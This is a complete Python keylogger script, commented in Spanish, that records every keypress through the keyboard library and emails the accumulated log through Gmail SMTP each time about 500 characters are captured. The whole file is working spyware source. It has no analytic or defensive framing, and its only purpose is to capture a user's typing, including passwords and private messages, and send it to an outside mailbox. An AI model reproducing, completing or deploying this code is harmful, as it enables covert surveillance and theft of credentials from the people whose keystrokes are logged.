#Importacion de modulos necesarios
import keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


# Configuración del correo electrónico
remitente = "YOU_EMAIL"
destinatario = "YOU_EMAIL"
password = "YOU_PASSWORD"


# Función para enviar un correo electrónico con un archivo adjunto
def enviar_email(asunto, mensaje, archivo_adjunto):

    msg = MIMEMultipart()
    msg['From'] = remitente
    msg['To'] = destinatario
    msg['Subject'] = asunto
    msg.attach(MIMEText(mensaje, 'plain'))


    with open(archivo_adjunto, 'rb') as adjunto:
        base = MIMEBase('application', 'octet-stream')
        base.set_payload(adjunto.read())
        encoders.encode_base64(base)
        base.add_header('Content-Disposition', f'attachment; filename="{archivo_adjunto}"')
        msg.attach(base)


    with smtplib.SMTP('smtp.gmail.com', 587) as servidor_smtp:
        servidor_smtp.starttls()
        servidor_smtp.login(remitente, password)
        servidor_smtp.sendmail(remitente, destinatario, msg.as_string())


# Función para registrar las teclas presionadas
def keylogger():

    archivo_log = 'registro.txt'
    registro = ''

    while True:
        
        tecla = keyboard.read_event()
        if tecla.event_type == 'down':
            if tecla.name == 'space':
                registro += '[ESPACIO]'
            elif tecla.name == 'enter':
                registro += '\n'
            elif tecla.name == 'backspace':
                registro = registro[:-1]
            elif tecla.name == 'caps lock':
                registro += '[CAPSLOCK]'
            elif tecla.name == 'shift':
                registro += '[SHIFT]'
            elif tecla.name == 'ctrl':
                registro += '[CTRL]'
            elif tecla.name == 'alt':
                registro += '[ALT]'
            elif len(tecla.name) == 1 and tecla.name.isprintable():
                if tecla.name.isupper():
                    registro += '[MAYUS]'
                registro += tecla.name.lower()

        if len(registro) >= 500:
            with open(archivo_log, 'w') as archivo:
                archivo.write(registro)
            enviar_email('Registro del keylogger', 'Adjunto encontrarás el registro del keylogger.', archivo_log)
            registro = ''

if __name__ == '__main__':
    keylogger()